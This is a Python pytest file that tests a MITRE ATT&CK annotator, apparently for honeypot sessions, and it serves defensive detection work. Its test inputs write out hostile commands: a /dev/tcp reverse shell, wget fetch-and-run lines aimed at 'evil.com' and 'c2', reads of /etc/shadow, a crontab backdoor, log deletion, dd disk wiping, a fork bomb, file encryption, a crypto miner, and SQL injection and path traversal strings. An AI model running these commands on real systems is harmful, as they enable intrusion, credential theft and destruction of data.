"""
Unit tests for the MITRE annotator.

Verifies that attack_mapping.py regex patterns
correctly detect known attack signatures in both
SSH commands and HTTP request payloads.
"""

import sys
import pytest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from core.mitre.session_annotator import (
    annotate_session,
    annotation_to_flat_dict,
    get_mitre_feature_columns,
)


class TestMitreAnnotation:
    """Test MITRE tactic detection on known payloads."""

    def _get_tactics(self, commands):
        """Helper: returns set of detected tactic names."""
        if isinstance(commands, str):
            commands = [commands]
        ann = annotate_session(commands)
        flat = annotation_to_flat_dict(ann)
        cols = get_mitre_feature_columns()
        # Return tactic names where value > 0
        return {
            col for col in cols
            if flat.get(col, 0) > 0
        }

    def test_feature_columns_count(self):
        """Should return exactly 21 feature columns."""
        cols = get_mitre_feature_columns()
        assert len(cols) == 21, \
            f"Expected 21 columns, got {len(cols)}"

    # ── SSH Command Detection ──

    def test_ssh_recon_detection(self):
        """id; whoami; uname should trigger discovery."""
        tactics = self._get_tactics([
            "id", "whoami", "uname -a",
            "cat /etc/passwd"
        ])
        assert any("discovery" in t for t in tactics), \
            f"Expected discovery, got {tactics}"

    def test_ssh_credential_access(self):
        """cat /etc/shadow should trigger credential_access."""
        tactics = self._get_tactics(["cat /etc/shadow"])
        assert any(
            "credential" in t.lower()
            for t in tactics
        ), f"Expected credential_access, got {tactics}"

    def test_ssh_persistence(self):
        """crontab should trigger persistence."""
        tactics = self._get_tactics([
            "crontab -l",
            "echo '* * * * * /tmp/backdoor' | crontab -"
        ])
        assert any(
            "persistence" in t for t in tactics
        ), f"Expected persistence, got {tactics}"

    def test_ssh_defense_evasion(self):
        """Removing logs should trigger defense_evasion."""
        tactics = self._get_tactics([
            "rm -rf /var/log/*",
            "history -c"
        ])
        assert any(
            "defense_evasion" in t for t in tactics
        ), f"Expected defense_evasion, got {tactics}"

    def test_ssh_safe_commands(self):
        """ls and pwd should produce minimal tactics."""
        tactics = self._get_tactics(["ls", "pwd", "exit"])
        # Safe commands may trigger 0 or very few tactics
        assert len(tactics) <= 3, \
            f"Too many tactics for safe cmds: {tactics}"

    # ── HTTP Attack Detection ──

    def test_http_sqli_detection(self):
        """SQL injection pattern should fire."""
        tactics = self._get_tactics([
            "GET /login?user=admin' OR 1=1--"
        ])
        # Should detect at least initial_access
        assert len(tactics) > 0, \
            f"SQLi not detected: {tactics}"

    def test_http_path_traversal(self):
        """Path traversal should fire."""
        tactics = self._get_tactics([
            "GET /../../etc/passwd"
        ])
        assert len(tactics) > 0, \
            f"Path traversal not detected: {tactics}"

    def test_flat_dict_is_numeric(self):
        """All flat dict values should be numeric
        (except string metadata fields)."""
        ann = annotate_session(["id", "whoami"])
        flat = annotation_to_flat_dict(ann)
        # These fields are known to be strings
        string_fields = {"severity_tier", "technique_ids"}
        for key, val in flat.items():
            if any(sf in key for sf in string_fields):
                continue
            assert isinstance(val, (int, float)), \
                f"Non-numeric value for {key}: {val}"

    # ── Additional Edge Cases ──

    def test_command_chaining(self):
        """Multiple commands in one string should all be analyzed."""
        # Commands separated by && or ; should each trigger detection
        tactics = self._get_tactics([
            "cat /etc/passwd && wget http://evil.com/bot"
        ])
        # Should detect both credential_access and command_and_control
        tactic_names = " ".join(tactics)
        assert "credential" in tactic_names or "discovery" in tactic_names
        assert "command_and_control" in tactic_names or "initial_access" in tactic_names

    def test_case_insensitive_matching(self):
        """Patterns should be case-insensitive."""
        tactics_upper = self._get_tactics(["CAT /ETC/SHADOW"])
        tactics_lower = self._get_tactics(["cat /etc/shadow"])
        # Both should detect credential access
        assert any("credential" in t.lower() for t in tactics_upper)
        assert any("credential" in t.lower() for t in tactics_lower)

    def test_base64_decode_detection(self):
        """Base64 decoding should trigger defense_evasion (T1140)."""
        tactics = self._get_tactics(["echo Y2F0IC9ldGMvc2hhZG93 | base64 -d | bash"])
        assert any("defense_evasion" in t for t in tactics), \
            f"Expected defense_evasion for base64 decode, got {tactics}"

    def test_reverse_shell_detection(self):
        """Reverse shell patterns should trigger execution (T1059.004)."""
        tactics = self._get_tactics(["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"])
        assert any("execution" in t for t in tactics), \
            f"Expected execution for reverse shell, got {tactics}"

    def test_ransomware_detection(self):
        """OpenSSL encryption should trigger impact (T1486)."""
        tactics = self._get_tactics(["openssl enc -aes-256-cbc -in /data -out /data.enc"])
        assert any("impact" in t for t in tactics), \
            f"Expected impact for ransomware pattern, got {tactics}"

    def test_disk_wipe_detection(self):
        """DD disk wipe should trigger impact (T1561.001)."""
        tactics = self._get_tactics(["dd if=/dev/zero of=/dev/sda"])
        assert any("impact" in t for t in tactics), \
            f"Expected impact for disk wipe, got {tactics}"

    def test_fork_bomb_detection(self):
        """Fork bomb should trigger impact (T1499.004)."""
        tactics = self._get_tactics([":(){ :|:& };:"])
        assert any("impact" in t for t in tactics), \
            f"Expected impact for fork bomb, got {tactics}"

    def test_crypto_mining_detection(self):
        """XMRig/miner references should trigger impact (T1496)."""
        tactics = self._get_tactics(["./xmrig -o pool.minexmr.com:4444"])
        assert any("impact" in t for t in tactics), \
            f"Expected impact for mining, got {tactics}"

    def test_empty_session(self):
        """Empty session should produce zero annotation."""
        ann = annotate_session([])
        assert ann["total_commands"] == 0
        assert ann["matched_commands"] == 0
        assert ann["kill_chain_score"] == 0
        assert ann["unique_technique_count"] == 0
        assert all(v == 0 for v in ann["tactic_vector"].values())

    def test_severity_tier_categorization(self):
        """Severity tier should map correctly."""
        # Low severity commands
        ann_low = annotate_session(["ls -la", "pwd"])
        assert ann_low["severity_tier"] in ["low", "none", "medium"]
        
        # High severity commands
        ann_high = annotate_session(["cat /etc/shadow", "wget http://c2/bot && chmod +x bot && ./bot"])
        assert ann_high["severity_tier"] in ["high", "critical", "emergency"]


if __name__ == "__main__":
    pytest.main([__file__, "-v"])